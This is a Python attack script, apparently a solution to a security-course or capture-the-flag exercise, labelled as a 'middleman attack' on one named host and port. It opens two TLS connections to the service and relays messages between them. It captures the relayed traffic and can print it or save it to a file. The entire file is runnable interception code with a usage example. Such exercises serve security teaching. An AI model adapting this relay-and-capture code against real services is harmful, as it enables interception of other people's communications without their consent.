#!/usr/bin/env python3

import socket
from ssl import SSLSocket
from argparse import ArgumentParser
from sys import exit

parser = ArgumentParser(description='Middleman attack on weird.goesec.de:9999',
                        epilog='EXAMPLE: $ python3 %(prog)s -v -o weird_capture.txt')
parser.add_argument('-o', '--out', help='write captured messages to file at path OUT')
parser.add_argument('-v', '--verbose', action='store_true', help="print captured messages to STDOUT")
args = parser.parse_args()

# Set up two raw Sockets and connect to service

sock1 = SSLSocket(socket.socket(socket.AF_INET, socket.SOCK_STREAM))
sock2 = SSLSocket(socket.socket(socket.AF_INET, socket.SOCK_STREAM))

try:
    sock1.connect(("weird.goesec.de", 9999))
    sock2.connect(("weird.goesec.de", 9999))
except:
    print("failed to establish connection")
    exit(1)


capture = '' # collect captured messages here

# receive on socket 1, capture, forward to socket 2, then vice versa, until the
# connection is closed.
while sock1 and sock2:
    try:
        if sock1:
            s1_capture = sock1.recv()
            if not s1_capture: break
            sock2.send(s1_capture)
            if args.verbose: print("sock1: %s" % s1_capture.decode("utf-8"))
            capture = "%s%s" % (capture, s1_capture.decode("utf-8"))
        if sock2:
            s2_capture = sock2.recv()
            if not s2_capture: break
            sock1.send(s2_capture)
            if args.verbose: print("sock2: %s" % s2_capture.decode("utf-8"))
            capture = "%s%s" % (capture, s2_capture.decode("utf-8"))
    except:
        print("connection dropped")
        break

if args.verbose: print("--END--")

if args.out:
    with open(args.out, 'w') as output:
        output.write(capture)

